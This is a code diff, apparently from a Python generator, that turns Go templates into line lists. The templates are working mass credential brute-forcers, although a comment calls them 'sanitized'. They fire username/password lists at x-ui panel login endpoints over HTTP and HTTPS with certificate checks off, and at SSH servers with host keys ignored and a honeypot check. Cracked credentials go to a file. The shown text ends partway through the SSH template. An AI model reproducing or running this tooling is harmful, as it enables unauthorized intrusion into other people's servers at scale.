@@ -41,1341 +41,1349 @@ TIMEOUT = 5
 VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志
 
 # =========================== Go 模板（已净化） ===========================
-XUI_GO_TEMPLATE_1 = """package main
-import (
-	"bufio"
-	"context"
-	"crypto/tls"
-	"encoding/json"
-	"fmt"
-	"io"
-	"net/http"
-	_ "net/http/pprof"
-	"net/url"
-	"os"
-	"os/signal"
-	"runtime"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"syscall"
-	"time"
-)
-var completedCount int64
-var isMemoryThrottled int32
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
-func memoryMonitor() {
-	var baselineMem uint64
-	var m runtime.MemStats
-	time.Sleep(2 * time.Second)
-	runtime.ReadMemStats(&m)
-	baselineMem = m.Sys
-	highWatermark := baselineMem + 200*1024*1024
-	lowWatermark := baselineMem + 100*1024*1024
-	ticker := time.NewTicker(2 * time.Second)
-	defer ticker.Stop()
-	for range ticker.C {
-		runtime.ReadMemStats(&m)
-		if m.Sys >= highWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 1)
-		} else if m.Sys < lowWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 0)
-		}
-	}
-}
-func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
-	defer wg.Done()
-	tr := &http.Transport{
-		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
-		DisableKeepAlives: true,
-	}
-	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }
-	for line := range tasks {
-		processIP(line, file, usernames, passwords, httpClient)
-		atomic.AddInt64(&completedCount, 1)
-	}
-}
-func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {
-	var ipPort string
-	u, err := url.Parse(strings.TrimSpace(line))
-	if err == nil && u.Host != "" {
-		ipPort = u.Host
-	} else {
-		ipPort = strings.TrimSpace(line)
-	}
-	parts := strings.Split(ipPort, ":")
-	if len(parts) != 2 { return }
-	ip, port := parts[0], parts[1]
-	for _, username := range usernames {
-		for _, password := range passwords {
-			var resp *http.Response
-			var err error
-			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
-			checkURLHttp := fmt.Sprintf("http://%s:%s/login", ip, port)
-			payloadHttp := fmt.Sprintf("username=%s&password=%s", username, password)
-			reqHttp, _ := http.NewRequestWithContext(ctx, "POST", checkURLHttp, strings.NewReader(payloadHttp))
-			reqHttp.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-			resp, err = httpClient.Do(reqHttp)
-			cancel()
-			if err != nil {
-				if resp != nil { resp.Body.Close() }
-				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)
-				checkURLHttps := fmt.Sprintf("https://%s:%s/login", ip, port)
-				payloadHttps := fmt.Sprintf("username=%s&password=%s", username, password)
-				reqHttps, _ := http.NewRequestWithContext(ctx2, "POST", checkURLHttps, strings.NewReader(payloadHttps))
-				reqHttps.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-				resp, err = httpClient.Do(reqHttps)
-				cancel2()
-			}
-			if err != nil {
-				if resp != nil { resp.Body.Close() }
-				continue
-			}
-			defer resp.Body.Close()
-			if resp.StatusCode == http.StatusOK {
-				body, readErr := io.ReadAll(resp.Body)
-				if readErr != nil { continue }
-				var responseData map[string]interface{}
-				if json.Unmarshal(body, &responseData) == nil {
-					if success, ok := responseData["success"].(bool); ok && success {
-						file.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
-						return
-					}
-				}
-			} else {
-				io.Copy(io.Discard, resp.Body)
-			}
-		}
-	}
-}
-func main() {
-	if len(os.Args) < 3 {
-		fmt.Println("Usage: ./program <inputFile> <outputFile>")
-		os.Exit(1)
-	}
-	inputFile, outputFile := os.Args[1], os.Args[2]
-	go func() { http.ListenAndServe("localhost:6060", nil) }()
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
-		os.Exit(0)
-	}()
-	go memoryMonitor()
-	batch, err := os.Open(inputFile)
-	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
-		return
-	}
-	defer batch.Close()
-	totalLines, _ := countLines(inputFile)
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		startTime := time.Now()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				percentage := float64(current) / float64(totalLines) * 100
-				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
-				elapsed := time.Since(startTime).Seconds()
-				var eta float64
-				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
-				}
-				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
-					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-	usernames, passwords := {user_list}, {pass_list}
-	if len(usernames) == 0 || len(passwords) == 0 {
-		fmt.Println("错误：用户名或密码列表为空。")
-		return
-	}
-	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
-		return
-	}
-	defer outFile.Close()
-	tasks := make(chan string, {semaphore_size})
-	var wg sync.WaitGroup
-	for i := 0; i < {semaphore_size}; i++ {
-		wg.Add(1)
-		go worker(tasks, outFile, &wg, usernames, passwords)
-	}
-	scanner := bufio.NewScanner(batch)
-	for scanner.Scan() {
-		for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
-		line := strings.TrimSpace(scanner.Text())
-		if line != "" { tasks <- line }
-	}
-	close(tasks)
-	wg.Wait()
-}
-"""
+# 为防止BOM字符问题，所有Go模板都重写为行列表
+XUI_GO_TEMPLATE_1_LINES = [
+    "package main",
+    "import (",
+    "	\"bufio\"",
+    "	\"context\"",
+    "	\"crypto/tls\"",
+    "	\"encoding/json\"",
+    "	\"fmt\"",
+    "	\"io\"",
+    "	\"net/http\"",
+    "	_ \"net/http/pprof\"",
+    "	\"net/url\"",
+    "	\"os\"",
+    "	\"os/signal\"",
+    "	\"runtime\"",
+    "	\"strings\"",
+    "	\"sync\"",
+    "	\"sync/atomic\"",
+    "	\"syscall\"",
+    "	\"time\"",
+    ")",
+    "var completedCount int64",
+    "var isMemoryThrottled int32",
+    "func countLines(filePath string) (int, error) {",
+    "	file, err := os.Open(filePath)",
+    "	if err != nil { return 0, err }",
+    "	defer file.Close()",
+    "	scanner := bufio.NewScanner(file)",
+    "	count := 0",
+    "	for scanner.Scan() { count++ }",
+    "	return count, scanner.Err()",
+    "}",
+    "func memoryMonitor() {",
+    "	var baselineMem uint64",
+    "	var m runtime.MemStats",
+    "	time.Sleep(2 * time.Second)",
+    "	runtime.ReadMemStats(&m)",
+    "	baselineMem = m.Sys",
+    "	highWatermark := baselineMem + 200*1024*1024",
+    "	lowWatermark := baselineMem + 100*1024*1024",
+    "	ticker := time.NewTicker(2 * time.Second)",
+    "	defer ticker.Stop()",
+    "	for range ticker.C {",
+    "		runtime.ReadMemStats(&m)",
+    "		if m.Sys >= highWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 1)",
+    "		} else if m.Sys < lowWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 0)",
+    "		}",
+    "	}",
+    "}",
+    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
+    "	defer wg.Done()",
+    "	tr := &http.Transport{",
+    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
+    "		DisableKeepAlives: true,",
+    "	}",
+    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
+    "	for line := range tasks {",
+    "		processIP(line, file, usernames, passwords, httpClient)",
+    "		atomic.AddInt64(&completedCount, 1)",
+    "	}",
+    "}",
+    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {",
+    "	var ipPort string",
+    "	u, err := url.Parse(strings.TrimSpace(line))",
+    "	if err == nil && u.Host != \"\" {",
+    "		ipPort = u.Host",
+    "	} else {",
+    "		ipPort = strings.TrimSpace(line)",
+    "	}",
+    "	parts := strings.Split(ipPort, \":\")",
+    "	if len(parts) != 2 { return }",
+    "	ip, port := parts[0], parts[1]",
+    "	for _, username := range usernames {",
+    "		for _, password := range passwords {",
+    "			var resp *http.Response",
+    "			var err error",
+    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
+    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/login\", ip, port)",
+    "			payloadHttp := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
+    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(payloadHttp))",
+    "			reqHttp.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
+    "			resp, err = httpClient.Do(reqHttp)",
+    "			cancel()",
+    "			if err != nil {",
+    "				if resp != nil { resp.Body.Close() }",
+    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
+    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/login\", ip, port)",
+    "				payloadHttps := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
+    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(payloadHttps))",
+    "				reqHttps.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
+    "				resp, err = httpClient.Do(reqHttps)",
+    "				cancel2()",
+    "			}",
+    "			if err != nil {",
+    "				if resp != nil { resp.Body.Close() }",
+    "				continue",
+    "			}",
+    "			defer resp.Body.Close()",
+    "			if resp.StatusCode == http.StatusOK {",
+    "				body, readErr := io.ReadAll(resp.Body)",
+    "				if readErr != nil { continue }",
+    "				var responseData map[string]interface{}",
+    "				if json.Unmarshal(body, &responseData) == nil {",
+    "					if success, ok := responseData[\"success\"].(bool); ok && success {",
+    "						file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
+    "						return",
+    "					}",
+    "				}",
+    "			} else {",
+    "				io.Copy(io.Discard, resp.Body)",
+    "			}",
+    "		}",
+    "	}",
+    "}",
+    "func main() {",
+    "	if len(os.Args) < 3 {",
+    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
+    "		os.Exit(1)",
+    "	}",
+    "	inputFile, outputFile := os.Args[1], os.Args[2]",
+    "	go func() { http.ListenAndServe(\"localhost:6060\", nil) }()",
+    "	sigChan := make(chan os.Signal, 1)",
+    "	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)",
+    "	go func() {",
+    "		<-sigChan",
+    "		fmt.Println(\"\\nGracefully shutting down...\")",
+    "		os.Exit(0)",
+    "	}()",
+    "	go memoryMonitor()",
+    "	batch, err := os.Open(inputFile)",
+    "	if err != nil {",
+    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
+    "		return",
+    "	}",
+    "	defer batch.Close()",
+    "	totalLines, _ := countLines(inputFile)",
+    "	go func() {",
+    "		ticker := time.NewTicker(500 * time.Millisecond)",
+    "		defer ticker.Stop()",
+    "		startTime := time.Now()",
+    "		for {",
+    "			current := atomic.LoadInt64(&completedCount)",
+    "			if totalLines > 0 {",
+    "				percentage := float64(current) / float64(totalLines) * 100",
+    "				bar := strings.Repeat(\"=\", int(percentage/2)) + strings.Repeat(\"-\", 50-int(percentage/2))",
+    "				elapsed := time.Since(startTime).Seconds()",
+    "				var eta float64",
+    "				if current > 0 {",
+    "					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)",
+    "				}",
+    "				fmt.Fprintf(os.Stdout, \"\\r[%s] %.2f%% (%d/%d) [%v<%v]\", bar, percentage, current, totalLines, ",
+    "					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)",
+    "			}",
+    "			if current >= int64(totalLines) {",
+    "				fmt.Fprintf(os.Stdout, \"\\n\")",
+    "				return",
+    "			}",
+    "			<-ticker.C",
+    "		}",
+    "	}()",
+    "	usernames, passwords := {user_list}, {pass_list}",
+    "	if len(usernames) == 0 || len(passwords) == 0 {",
+    "		fmt.Println(\"错误：用户名或密码列表为空。\")",
+    "		return",
+    "	}",
+    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
+    "	if err != nil {",
+    "		fmt.Println(\"无法打开输出文件:\", err)",
+    "		return",
+    "	}",
+    "	defer outFile.Close()",
+    "	tasks := make(chan string, {semaphore_size})",
+    "	var wg sync.WaitGroup",
+    "	for i := 0; i < {semaphore_size}; i++ {",
+    "		wg.Add(1)",
+    "		go worker(tasks, outFile, &wg, usernames, passwords)",
+    "	}",
+    "	scanner := bufio.NewScanner(batch)",
+    "	for scanner.Scan() {",
+    "		for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }",
+    "		line := strings.TrimSpace(scanner.Text())",
+    "		if line != \"\" { tasks <- line }",
+    "	}",
+    "	close(tasks)",
+    "	wg.Wait()",
+    "}",
+]
 
-XUI_GO_TEMPLATE_2 = """package main
-import (
-	"bufio"
-	"context"
-	"crypto/tls"
-	"encoding/json"
-	"fmt"
-	"io"
-	"net/http"
-	_ "net/http/pprof"
-	"net/url"
-	"os"
-	"os/signal"
-	"runtime"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"syscall"
-	"time"
-)
-var completedCount int64
-var isMemoryThrottled int32
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
-func memoryMonitor() {
-	var baselineMem uint64
-	var m runtime.MemStats
-	time.Sleep(2 * time.Second)
-	runtime.ReadMemStats(&m)
-	baselineMem = m.Sys
-	highWatermark := baselineMem + 200*1024*1024
-	lowWatermark := baselineMem + 100*1024*1024
-	ticker := time.NewTicker(2 * time.Second)
-	defer ticker.Stop()
-	for range ticker.C {
-		runtime.ReadMemStats(&m)
-		if m.Sys >= highWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 1)
-		} else if m.Sys < lowWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 0)
-		}
-	}
-}
-func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
-	defer wg.Done()
-	tr := &http.Transport{
-		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
-		DisableKeepAlives: true,
-	}
-	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }
-	for line := range tasks {
-		processIP(line, file, usernames, passwords, httpClient)
-		atomic.AddInt64(&completedCount, 1)
-	}
-}
-func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {
-	var ipPort string
-	u, err := url.Parse(strings.TrimSpace(line))
-	if err == nil && u.Host != "" {
-		ipPort = u.Host
-	} else {
-		ipPort = strings.TrimSpace(line)
-	}
-	parts := strings.Split(ipPort, ":")
-	if len(parts) != 2 { return }
-	ip, port := parts[0], parts[1]
-	for _, username := range usernames {
-		for _, password := range passwords {
-			var resp *http.Response
-			var err error
-			data := map[string]string{"username": username, "password": password}
-			jsonPayload, _ := json.Marshal(data)
-			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
-			checkURLHttp := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
-			reqHttp, _ := http.NewRequestWithContext(ctx, "POST", checkURLHttp, strings.NewReader(string(jsonPayload)))
-			reqHttp.Header.Set("Content-Type", "application/json")
-			resp, err = httpClient.Do(reqHttp)
-			cancel()
-			if err != nil {
-				if resp != nil { resp.Body.Close() }
-				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)
-				checkURLHttps := fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
-				reqHttps, _ := http.NewRequestWithContext(ctx2, "POST", checkURLHttps, strings.NewReader(string(jsonPayload)))
-				reqHttps.Header.Set("Content-Type", "application/json")
-				resp, err = httpClient.Do(reqHttps)
-				cancel2()
-			}
-			if err != nil {
-				if resp != nil { resp.Body.Close() }
-				continue
-			}
-			defer resp.Body.Close()
-			if resp.StatusCode == http.StatusOK {
-				body, readErr := io.ReadAll(resp.Body)
-				if readErr != nil { continue }
-				var responseData map[string]interface{}
-				if json.Unmarshal(body, &responseData) == nil {
-					if success, ok := responseData["success"].(bool); ok && success {
-						file.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
-						return
-					}
-				}
-			} else {
-				io.Copy(io.Discard, resp.Body)
-			}
-		}
-	}
-}
-func main() {
-	if len(os.Args) < 3 {
-		fmt.Println("Usage: ./program <inputFile> <outputFile>")
-		os.Exit(1)
-	}
-	inputFile, outputFile := os.Args[1], os.Args[2]
-	go func() { http.ListenAndServe("localhost:6060", nil) }()
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
-		os.Exit(0)
-	}()
-    go memoryMonitor()
-	batch, err := os.Open(inputFile)
-	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
-		return
-	}
-	defer batch.Close()
-	totalLines, _ := countLines(inputFile)
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		startTime := time.Now()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				percentage := float64(current) / float64(totalLines) * 100
-				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
-				elapsed := time.Since(startTime).Seconds()
-				var eta float64
-				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
-				}
-				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
-					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-	usernames, passwords := {user_list}, {pass_list}
-    if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。")
-        return
-    }
-	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
-		return
-	}
-	defer outFile.Close()
-	tasks := make(chan string, {semaphore_size})
-	var wg sync.WaitGroup
-	for i := 0; i < {semaphore_size}; i++ {
-		wg.Add(1)
-		go worker(tasks, outFile, &wg, usernames, passwords)
-	}
-	scanner := bufio.NewScanner(batch)
-	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
-		line := strings.TrimSpace(scanner.Text())
-		if line != "" { tasks <- line }
-	}
-	close(tasks)
-	wg.Wait()
-}
-"""
+XUI_GO_TEMPLATE_2_LINES = [
+    "package main",
+    "import (",
+    "	\"bufio\"",
+    "	\"context\"",
+    "	\"crypto/tls\"",
+    "	\"encoding/json\"",
+    "	\"fmt\"",
+    "	\"io\"",
+    "	\"net/http\"",
+    "	_ \"net/http/pprof\"",
+    "	\"net/url\"",
+    "	\"os\"",
+    "	\"os/signal\"",
+    "	\"runtime\"",
+    "	\"strings\"",
+    "	\"sync\"",
+    "	\"sync/atomic\"",
+    "	\"syscall\"",
+    "	\"time\"",
+    ")",
+    "var completedCount int64",
+    "var isMemoryThrottled int32",
+    "func countLines(filePath string) (int, error) {",
+    "	file, err := os.Open(filePath)",
+    "	if err != nil { return 0, err }",
+    "	defer file.Close()",
+    "	scanner := bufio.NewScanner(file)",
+    "	count := 0",
+    "	for scanner.Scan() { count++ }",
+    "	return count, scanner.Err()",
+    "}",
+    "func memoryMonitor() {",
+    "	var baselineMem uint64",
+    "	var m runtime.MemStats",
+    "	time.Sleep(2 * time.Second)",
+    "	runtime.ReadMemStats(&m)",
+    "	baselineMem = m.Sys",
+    "	highWatermark := baselineMem + 200*1024*1024",
+    "	lowWatermark := baselineMem + 100*1024*1024",
+    "	ticker := time.NewTicker(2 * time.Second)",
+    "	defer ticker.Stop()",
+    "	for range ticker.C {",
+    "		runtime.ReadMemStats(&m)",
+    "		if m.Sys >= highWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 1)",
+    "		} else if m.Sys < lowWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 0)",
+    "		}",
+    "	}",
+    "}",
+    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
+    "	defer wg.Done()",
+    "	tr := &http.Transport{",
+    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
+    "		DisableKeepAlives: true,",
+    "	}",
+    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
+    "	for line := range tasks {",
+    "		processIP(line, file, usernames, passwords, httpClient)",
+    "		atomic.AddInt64(&completedCount, 1)",
+    "	}",
+    "}",
+    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {",
+    "	var ipPort string",
+    "	u, err := url.Parse(strings.TrimSpace(line))",
+    "	if err == nil && u.Host != \"\" {",
+    "		ipPort = u.Host",
+    "	} else {",
+    "		ipPort = strings.TrimSpace(line)",
+    "	}",
+    "	parts := strings.Split(ipPort, \":\")",
+    "	if len(parts) != 2 { return }",
+    "	ip, port := parts[0], parts[1]",
+    "	for _, username := range usernames {",
+    "		for _, password := range passwords {",
+    "			var resp *http.Response",
+    "			var err error",
+    "			data := map[string]string{\"username\": username, \"password\": password}",
+    "			jsonPayload, _ := json.Marshal(data)",
+    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
+    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/api/v1/login\", ip, port)",
+    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(string(jsonPayload)))",
+    "			reqHttp.Header.Set(\"Content-Type\", \"application/json\")",
+    "			resp, err = httpClient.Do(reqHttp)",
+    "			cancel()",
+    "			if err != nil {",
+    "				if resp != nil { resp.Body.Close() }",
+    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
+    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/api/v1/login\", ip, port)",
+    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(string(jsonPayload)))",
+    "				reqHttps.Header.Set(\"Content-Type\", \"application/json\")",
+    "				resp, err = httpClient.Do(reqHttps)",
+    "				cancel2()",
+    "			}",
+    "			if err != nil {",
+    "				if resp != nil { resp.Body.Close() }",
+    "				continue",
+    "			}",
+    "			defer resp.Body.Close()",
+    "			if resp.StatusCode == http.StatusOK {",
+    "				body, readErr := io.ReadAll(resp.Body)",
+    "				if readErr != nil { continue }",
+    "				var responseData map[string]interface{}",
+    "				if json.Unmarshal(body, &responseData) == nil {",
+    "					if success, ok := responseData[\"success\"].(bool); ok && success {",
+    "						file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
+    "						return",
+    "					}",
+    "				}",
+    "			} else {",
+    "				io.Copy(io.Discard, resp.Body)",
+    "			}",
+    "		}",
+    "	}",
+    "}",
+    "func main() {",
+    "	if len(os.Args) < 3 {",
+    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
+    "		os.Exit(1)",
+    "	}",
+    "	inputFile, outputFile := os.Args[1], os.Args[2]",
+    "	go func() { http.ListenAndServe(\"localhost:6060\", nil) }()",
+    "	sigChan := make(chan os.Signal, 1)",
+    "	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)",
+    "	go func() {",
+    "		<-sigChan",
+    "		fmt.Println(\"\\nGracefully shutting down...\")",
+    "		os.Exit(0)",
+    "	}()",
+    "    go memoryMonitor()",
+    "	batch, err := os.Open(inputFile)",
+    "	if err != nil {",
+    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
+    "		return",
+    "	}",
+    "	defer batch.Close()",
+    "	totalLines, _ := countLines(inputFile)",
+    "	go func() {",
+    "		ticker := time.NewTicker(500 * time.Millisecond)",
+    "		defer ticker.Stop()",
+    "		startTime := time.Now()",
+    "		for {",
+    "			current := atomic.LoadInt64(&completedCount)",
+    "			if totalLines > 0 {",
+    "				percentage := float64(current) / float64(totalLines) * 100",
+    "				bar := strings.Repeat(\"=\", int(percentage/2)) + strings.Repeat(\"-\", 50-int(percentage/2))",
+    "				elapsed := time.Since(startTime).Seconds()",
+    "				var eta float64",
+    "				if current > 0 {",
+    "					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)",
+    "				}",
+    "				fmt.Fprintf(os.Stdout, \"\\r[%s] %.2f%% (%d/%d) [%v<%v]\", bar, percentage, current, totalLines, ",
+    "					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)",
+    "			}",
+    "			if current >= int64(totalLines) {",
+    "				fmt.Fprintf(os.Stdout, \"\\n\")",
+    "				return",
+    "			}",
+    "			<-ticker.C",
+    "		}",
+    "	}()",
+    "	usernames, passwords := {user_list}, {pass_list}",
+    "    if len(usernames) == 0 || len(passwords) == 0 {",
+    "        fmt.Println(\"错误：用户名或密码列表为空。\")",
+    "        return",
+    "    }",
+    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
+    "	if err != nil {",
+    "		fmt.Println(\"无法打开输出文件:\", err)",
+    "		return",
+    "	}",
+    "	defer outFile.Close()",
+    "	tasks := make(chan string, {semaphore_size})",
+    "	var wg sync.WaitGroup",
+    "	for i := 0; i < {semaphore_size}; i++ {",
+    "		wg.Add(1)",
+    "		go worker(tasks, outFile, &wg, usernames, passwords)",
+    "	}",
+    "	scanner := bufio.NewScanner(batch)",
+    "	for scanner.Scan() {",
+    "        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }",
+    "		line := strings.TrimSpace(scanner.Text())",
+    "		if line != \"\" { tasks <- line }",
+    "	}",
+    "	close(tasks)",
+    "	wg.Wait()",
+    "}",
+]
 
-XUI_GO_TEMPLATE_6 = """package main
-import (
-	"bufio"
-	"fmt"
-	"net/url"
-	"os"
-	"os/signal"
-	"runtime"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"syscall"
-	"time"
-	"golang.org/x/crypto/ssh"
-)
-var completedCount int64
-var isMemoryThrottled int32
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
-func memoryMonitor() {
-	var baselineMem uint64
-	var m runtime.MemStats
-	time.Sleep(2 * time.Second)
-	runtime.ReadMemStats(&m)
-	baselineMem = m.Sys
-	highWatermark := baselineMem + 200*1024*1024
-	lowWatermark := baselineMem + 100*1024*1024
-	ticker := time.NewTicker(2 * time.Second)
-	defer ticker.Stop()
-	for range ticker.C {
-		runtime.ReadMemStats(&m)
-		if m.Sys >= highWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 1)
-		} else if m.Sys < lowWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 0)
-		}
-	}
-}
-func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
-	defer wg.Done()
-	for line := range tasks {
-		processIP(line, file, usernames, passwords)
-		atomic.AddInt64(&completedCount, 1)
-	}
-}
-func processIP(line string, file *os.File, usernames []string, passwords []string) {
-	var ipPort string
-	u, err := url.Parse(strings.TrimSpace(line))
-	if err == nil && u.Host != "" {
-		ipPort = u.Host
-	} else {
-		ipPort = strings.TrimSpace(line)
-	}
-	parts := strings.Split(ipPort, ":")
-	if len(parts) != 2 { return }
-	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
-	for _, username := range usernames {
-		for _, password := range passwords {
-			client, success, _ := trySSH(ip, port, username, password)
-			if success {
-				defer client.Close()
-				if !isLikelyHoneypot(client) {
-					file.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
-				}
-				return
-			}
-		}
-	}
-}
-func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {
-	addr := fmt.Sprintf("%s:%s", ip, port)
-	config := &ssh.ClientConfig{
-		User:            username,
-		Auth:            []ssh.AuthMethod{ssh.Password(password)},
-		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-		Timeout:         {timeout} * time.Second,
-	}
-	client, err := ssh.Dial("tcp", addr, config)
-    return client, err == nil, err
-}
-func isLikelyHoneypot(client *ssh.Client) bool {
-	session, err := client.NewSession()
-	if err != nil { return true }
-	defer session.Close()
-	err = session.RequestPty("xterm", 80, 40, ssh.TerminalModes{})
-	if err != nil { return true }
-	output, err := session.CombinedOutput("echo $((1+1))")
-	if err != nil { return true }
-	return strings.TrimSpace(string(output)) != "2"
-}
-func main() {
-	if len(os.Args) < 3 {
-		fmt.Println("Usage: ./program <inputFile> <outputFile>")
-		os.Exit(1)
-	}
